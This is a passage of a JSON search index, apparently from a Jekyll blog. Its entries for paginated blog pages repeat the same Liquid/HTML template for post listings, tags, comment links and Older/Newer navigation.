        "content"  : "<div class=\"posts\">\n  {% for post in paginator.posts %}\n  <div class=\"post\">\n    <h1 class=\"post-title\">\n      <a href=\"{{ site.baseurl }}{{ post.url }}\">\n        {{ post.title }}\n      </a>\n    </h1>\n\n    <span class=\"post-date\">{{ post.date | date_to_string }}</span>\n    {% if post.tags %} |\n    {% for tag in post.tags %}\n    <a href=\"{{ site.baseurl }}{{ site.tag_page }}#{{ tag | slugify }}\" class=\"post-tag\">{{ tag }}</a>\n    {% endfor %}\n    {% endif %}\n\n    <article>\n      {{ post.excerpt | markdownify }}\n    <article>\n    <div class=\"post-more\">\n      {% if site.disqus_short_name %}\n      <a href=\"{{ site.baseurl }}{{ post.url }}#disqus_thread\"> <i class=\"fa fa-comments\" aria-hidden=\"true\"></i>Comment</a>&nbsp;\n      {% endif %}\n      <a href=\"{{ site.baseurl }}{{ post.url }}\"><i class=\"fa fa-plus-circle\" aria-hidden=\"true\"></i>Read more</a>\n    </div>\n  </div>\n  {% endfor %}\n</div>\n\n<div class=\"pagination\">\n  {% if paginator.next_page %}\n    <a class=\"pagination-item older\" href=\"{{ site.baseurl }}/blog/page{{paginator.next_page}}\">Older</a>\n  {% else %}\n    <span class=\"pagination-item older\">Older</span>\n  {% endif %}\n  {% if paginator.previous_page %}\n    {% if paginator.page == 2 %}\n      <a class=\"pagination-item newer\" href=\"{{ site.baseurl }}/blog/\">Newer</a>\n    {% else %}\n      <a class=\"pagination-item newer\" href=\"{{ site.baseurl }}/blog/page{{paginator.previous_page}}\">Newer</a>\n    {% endif %}\n  {% else %}\n    <span class=\"pagination-item newer\">Newer</span>\n  {% endif %}\n</div>\n"
     
   } ,
  
   {
     
        "title"    : "Blog",
        "category" : "",
        "tags"     : "",
        "url"      : "/blog/page3/",
        "date"     : "",
        "content"  : "<div class=\"posts\">\n  {% for post in paginator.posts %}\n  <div class=\"post\">\n    <h1 class=\"post-title\">\n      <a href=\"{{ site.baseurl }}{{ post.url }}\">\n        {{ post.title }}\n      </a>\n    </h1>\n\n    <span class=\"post-date\">{{ post.date | date_to_string }}</span>\n    {% if post.tags %} |\n    {% for tag in post.tags %}\n    <a href=\"{{ site.baseurl }}{{ site.tag_page }}#{{ tag | slugify }}\" class=\"post-tag\">{{ tag }}</a>\n    {% endfor %}\n    {% endif %}\n\n    <article>\n      {{ post.excerpt | markdownify }}\n    <article>\n    <div class=\"post-more\">\n      {% if site.disqus_short_name %}\n      <a href=\"{{ site.baseurl }}{{ post.url }}#disqus_thread\"> <i class=\"fa fa-comments\" aria-hidden=\"true\"></i>Comment</a>&nbsp;\n      {% endif %}\n      <a href=\"{{ site.baseurl }}{{ post.url }}\"><i class=\"fa fa-plus-circle\" aria-hidden=\"true\"></i>Read more</a>\n    </div>\n  </div>\n  {% endfor %}\n</div>\n\n<div class=\"pagination\">\n  {% if paginator.next_page %}\n    <a class=\"pagination-item older\" href=\"{{ site.baseurl }}/blog/page{{paginator.next_page}}\">Older</a>\n  {% else %}\n    <span class=\"pagination-item older\">Older</span>\n  {% endif %}\n  {% if paginator.previous_page %}\n    {% if paginator.page == 2 %}\n      <a class=\"pagination-item newer\" href=\"{{ site.baseurl }}/blog/\">Newer</a>\n    {% else %}\n      <a class=\"pagination-item newer\" href=\"{{ site.baseurl }}/blog/page{{paginator.previous_page}}\">Newer</a>\n    {% endif %}\n  {% else %}\n    <span class=\"pagination-item newer\">Newer</span>\n  {% endif %}\n</div>\n"
     
   } ,
  
   {
     
        "title"    : "Blog",
        "category" : "",
        "tags"     : "",
        "url"      : "/blog/page4/",
        "date"     : "",
        "content"  : "<div class=\"posts\">\n  {% for post in paginator.posts %}\n  <div class=\"post\">\n    <h1 class=\"post-title\">\n      <a href=\"{{ site.baseurl }}{{ post.url }}\">\n        {{ post.title }}\n      </a>\n    </h1>\n\n    <span class=\"post-date\">{{ post.date | date_to_string }}</span>\n    {% if post.tags %} |\n    {% for tag in post.tags %}\n    <a href=\"{{ site.baseurl }}{{ site.tag_page }}#{{ tag | slugify }}\" class=\"post-tag\">{{ tag }}</a>\n    {% endfor %}\n    {% endif %}\n\n    <article>\n      {{ post.excerpt | markdownify }}\n    <article>\n    <div class=\"post-more\">\n      {% if site.disqus_short_name %}\n      <a href=\"{{ site.baseurl }}{{ post.url }}#disqus_thread\"> <i class=\"fa fa-comments\" aria-hidden=\"true\"></i>Comment</a>&nbsp;\n      {% endif %}\n      <a href=\"{{ site.baseurl }}{{ post.url }}\"><i class=\"fa fa-plus-circle\" aria-hidden=\"true\"></i>Read more</a>\n    </div>\n  </div>\n  {% endfor %}\n</div>\n\n<div class=\"pagination\">\n  {% if paginator.next_page %}\n    <a class=\"pagination-item older\" href=\"{{ site.baseurl }}/blog/page{{paginator.next_page}}\">Older</a>\n  {% else %}\n    <span class=\"pagination-item older\">Older</span>\n  {% endif %}\n  {% if paginator.previous_page %}\n    {% if paginator.page == 2 %}\n      <a class=\"pagination-item newer\" href=\"{{ site.baseurl }}/blog/\">Newer</a>\n    {% else %}\n      <a class=\"pagination-item newer\" href=\"{{ site.baseurl }}/blog/page{{paginator.previous_page}}\">Newer</a>\n    {% endif %}\n  {% else %}\n    <span class=\"pagination-item newer\">Newer</span>\n  {% endif %}\n</div>\n"
     
   } 
  
]
